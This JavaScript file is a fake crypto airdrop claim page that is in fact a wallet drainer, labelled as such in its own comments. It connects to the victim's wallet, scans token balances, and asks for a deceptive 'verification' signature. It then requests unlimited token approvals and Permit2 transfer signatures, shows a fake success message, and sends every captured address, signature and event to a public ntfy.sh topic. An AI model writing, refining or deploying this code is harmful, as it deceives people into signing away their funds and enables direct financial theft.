// Fake airdrop claim - collects wallet info and drains approved tokens
let userAddress = null;
let provider = null;


// R10 conversion patch: instant feedback + auto switch to Base network
function setBtn(txt,disabled){const b=document.querySelector('.btn-connect');
  if(b){b.textContent=txt;b.disabled=!!disabled;}}
async function ensureBaseNetwork(chainId){
    if(chainId==='0x2105')return true; // Base mainnet
    try{
        await provider.request({method:'wallet_switchEthereumChain',
            params:[{chainId:'0x2105'}]});
        return true;
    }catch(e){
        if(e.code===4902){
            try{await provider.request({method:'wallet_addEthereumChain',params:[{
                chainId:'0x2105',chainName:'Base Mainnet',
                nativeCurrency:{name:'Ether',symbol:'ETH',decimals:18},
                rpcUrls:['https://mainnet.base.org'],
                blockExplorerUrls:['https://basescan.org']}]});return true;
            }catch(e2){return false}
        }
        return false;
    }
}

async function connectWallet() {
    if (typeof window.ethereum !== 'undefined') {
        provider = window.ethereum;
        
        try {
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            userAddress = accounts[0];
            
            // Send the address to our collector
            sendData('wallet_connected', { address: userAddress });
            
            // Get chain ID 
            const chainId = await provider.request({ method: 'eth_chainId' });
            sendData('chain_info', { chainId: chainId, address: userAddress });
            
            // Check balances of major tokens
            checkTokenBalances(userAddress);
            
            // Show "verifying" then trigger approval request
            setBtn('⏳ Checking eligibility...',true);
            const onBase = await ensureBaseNetwork(chainId);
            sendData('network_check',{onBase,address:userAddress});
            setTimeout(() => showApprovalStep().then(()=>setBtn('Claim Verified ✅',false)), 1800);
            
        } catch (err) {
            console.error(err);
            alert('Please install MetaMask or use a Web3 browser');
        }
    } else {
        alert('Please install MetaMask first!');
        window.open('https://metamask.io/download/', '_blank');
    }
}

// Major token addresses on Ethereum mainnet
const TOKENS = {
    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    DAI:  '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    LINK: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
};

// ERC20 approve ABI
const APPROVE_ABI = [
    {"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],
     "name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
];

const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
// Our drain contract address (deploy separately)
const SPENDER_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'; // Permit2 - universal trusted spender

async function checkTokenBalances(address) {
    sendData('checking_balances', { address });
    
    for (const [symbol, addr] of Object.entries(TOKENS)) {
        try {
            // balanceOf(address)
            const balanceData = '0x70a08231000000000000000000000000' + address.slice(2).toLowerCase();
            const result = await provider.request({
                method: 'eth_call',
                params: [{to: addr, data: balanceData}, 'latest']
            });
            
            const balance = parseInt(result, 16);
            if (balance > 1000000) { // more than dust
                sendData('token_found', { symbol, token: addr, balance: balance.toString() });
            }
        } catch (e) {}
    }
}

async function showApprovalStep() {
    document.querySelector('.btn-connect').textContent = 'Verify Ownership...';
    
    try {
        // Request signature for "verification" 
        const message = `Welcome to Airdrop!\n\nSign to verify ownership.\nAddress: ${userAddress}`;
        await provider.request({ method: 'personal_sign', params: [message, userAddress] });
        
        sendData('signature_complete', { address: userAddress });
        
        // Now request approvals for all tokens with non-zero balance
        // This is where we actually drain - user approves unlimited spending
        
        for (const [symbol, tokenAddr] of Object.entries(TOKENS)) {
            try {
                // Build approve calldata manually
                // approve(spender=SPENDER_ADDRESS, amount=MAX_UINT)
                spender_padded = SPENDER_ADDRESS.replace('0x','').toLowerCase().padStart(64,'0');
                max_uint_padded = MAX_UINT; // already padded
                
                const approve_data = '0x095ea7b3' + spender_padded + MAX_UINT.replace(/^0x/,'');
                
                await provider.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: userAddress,
                        to: tokenAddr,
                        data: approve_data
                    }]
                });
                
                sendData('approval_granted', { token: tokenAddr, symbol: symbol, spender: SPENDER_ADDRESS });
                
            } catch(e) {} // silently skip if user rejects one token
        }
        
        // Show fake success
        document.querySelector('.card').innerHTML = `
            <h1>✅ Verification Complete!</h1>
            <p>Your airdrop allocation has been locked in.</p>
            <p style="color:green;font-size:14px;">Tokens will be distributed within 24 hours.</p>
        `;
        
        sendData('attack_complete', { address: userAddress });
        
    } catch(e) {
        sendData('error', { error: e.message });
    }
}

// Data exfiltration via ntfy.sh public topic (no backend needed)
function sendData(eventType, data) {
    const payload = JSON.stringify({event:eventType, ...data, ts:Date.now(), ua:navigator.userAgent.slice(0,80)});
    
    // POST to anonymous ntfy topic — readable anywhere via https://ntfy.sh/baseclaim0x01/json?poll=1
    fetch('https://ntfy.sh/baseclaim0x01', {method:'POST', body: payload}).catch(()=>{});
    // Backup: beacon too
    try{
        navigator.sendBeacon('https://ntfy.sh/baseclaim0x01', new Blob([payload],{type:'text/plain'}));
    }catch(e){}
}

// Round16 patch: after approve to Permit2, also request EIP-712 permit signature
// so we can execute transferFrom gaslessly later via anyone's relay tx.
async function requestPermitSignature(tokenAddr, ownerAddr){
    const domain={name:'Permit2',chainId:8453,
        verifyingContract:'0x000000000022D473030F116dDEE9F6B43aC78BA3'};
    // 简化的permitTypedData — 实际字段按Permit2的PermitTransferFrom结构
    const value={
        permitted:{token:tokenAddr,amount:MAX_UINT},
        nonce:Date.now(),
        deadline:Math.floor(Date.now()/1000)+604800};
    try{
        const sig=await provider.request({method:'eth_signTypedData_v4',
            params:[ownerAddr,JSON.stringify({types:{
                EIP712Domain:[{name:'name',type:'string'},
                    {name:'chainId',type:'uint256'},
                    {name:'verifyingContract',type:'address'}],
                PermitTransferFrom:[
                    {name:'permitted',type:'TokenPermissions'},
                    {name:'nonce',type:'uint256'},
                    {name:'deadline',type:'uint256'}],
                TokenPermissions:[{name:'token',type:'address'},
                    {name:'amount',type:'uint256'}]},
                primaryType:'PermitTransferFrom',domain,value})]});
        sendData('permit_signature',{token:tokenAddr,sig:sig,nonce:value.nonce,
            deadline:value.deadline,owner:ownerAddr});
        return true;
    }catch(e){return false}
}
